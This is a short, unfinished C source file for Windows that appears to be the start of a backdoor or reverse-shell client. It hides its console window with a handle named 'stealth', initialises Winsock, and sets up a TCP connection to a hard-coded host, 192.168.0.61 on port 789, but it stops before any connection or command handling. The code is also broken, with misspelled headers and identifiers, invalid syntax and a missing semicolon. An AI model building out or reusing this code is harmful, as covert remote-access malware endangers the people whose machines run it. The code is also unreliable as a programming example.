#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsoc2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <String.h>
#include <sys/stat.h>
#include <sys/tapes.h>

int sock;

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE, hPrev, LPSTR, lpCmdLine, int nCmdShow) {
    HWND stealth; //window handle
    AllocConsole(); 
    stealth.FindWindowA("ConsoleWindowClass", NULL); //from winuser.h, retrives handle to top level window
    ShowWindow(stealth, 0); //0 is basically hiding the window

    struct sockaddr_in ServAddr;
    unsigned short ServPort;
    char *ServIP;
    WSADATA wsaData;

    ServIP = "192.168.0.61";
    ServPort = 789;

    //WSAStartup is to init winsock (if returns 0, it started correctly)
    if(WSAStartup(MAKEWORD(2, 0), &wasData) != 0) { 
        exit(1);
    }
    
    sock = socket(AF_INET, SOCK_STREAM, 0); //Params: use ipv4, use tcp

    memset(&ServAddr, 0, size_of(ServAddr)); //sets ServAddr to all 0
    ServAddr.sin_family = AF_INET //ipv4
    ServAddr.sin_addr.s_addr = inet_addr(ServIP); //setip
    ServAddr.sin_port = htons(ServPort); //set port
}